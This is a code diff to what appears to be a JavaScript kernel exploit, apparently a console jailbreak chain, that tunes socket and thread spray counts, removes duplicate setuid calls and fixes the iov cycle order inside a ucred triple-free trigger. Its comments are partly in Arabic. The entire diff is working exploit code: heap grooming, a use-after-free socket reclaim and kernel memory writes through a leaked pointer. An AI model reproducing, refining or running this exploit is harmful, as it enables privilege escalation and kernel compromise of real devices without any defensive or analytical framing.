@@ -114,9 +114,9 @@ var UIO_IOV_NUM = 0x14; // 20
 var MSG_IOV_NUM = 0x17; // 23
 
 // Params for kext stability
-var IPV6_SOCK_NUM = 512;
+var IPV6_SOCK_NUM = 256;
 var IOV_THREAD_NUM = 16;
-var UIO_THREAD_NUM = 8;
+var UIO_THREAD_NUM = 16;
 var MAIN_LOOP_ITERATIONS = 3;
 var TRIPLEFREE_ITERATIONS = 4;
 var MAX_ROUNDS_TWIN = 10;
@@ -1270,7 +1270,6 @@ function remove_uaf_file() {
 // ثوابت بدل الأرقام السحرية
 var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 16;
 var TRIPLEFREE_REFCOUNT_MAX_WAIT = 2000;
-var USE_ALT_IOV_ORDER = false;
 function trigger_ucred_triplefree() {
   var end = false;
 
@@ -1289,13 +1288,11 @@ function trigger_ucred_triplefree() {
 
     // 2) allocate new ucred
     setuid(1);
-    setuid(1);
 
     // 3) reclaim fd → uaf_socket
     uaf_socket = Number(socket(AF_UNIX, SOCK_STREAM, 0));
 
     // 4) free previous ucred
-    setuid(1);
     setuid(1);
 
     // 5) unregister → free file + ucred
@@ -1327,20 +1324,13 @@ function trigger_ucred_triplefree() {
     // 10) انتظار refcount = 1 مع ترتيب ثابت لدورة iov
     var count = 0;
     while (count < TRIPLEFREE_REFCOUNT_MAX_WAIT) {
-      
-      
-      if (USE_ALT_IOV_ORDER) {
-          write(new BigInt(iov_sock_1), tmp, 1);
-          trigger_iov_recvmsg();
-          read(new BigInt(iov_sock_0), tmp, 1);
-          wait_iov_recvmsg();
-      } else {
-          trigger_iov_recvmsg();
-          write(new BigInt(iov_sock_1), tmp, 1);
-          wait_iov_recvmsg();
-          read(new BigInt(iov_sock_0), tmp, 1);
-      }
+      // شغّل recvmsg
+      trigger_iov_recvmsg();
 
+      // كمّل دورة iov بالكامل
+      write(new BigInt(iov_sock_1), tmp, 1);
+      wait_iov_recvmsg();
+      read(new BigInt(iov_sock_0), tmp, 1);
 
       // دلوقتي بس نقرأ refcount
       write32(leak_rthdr.add(0x04), 0);
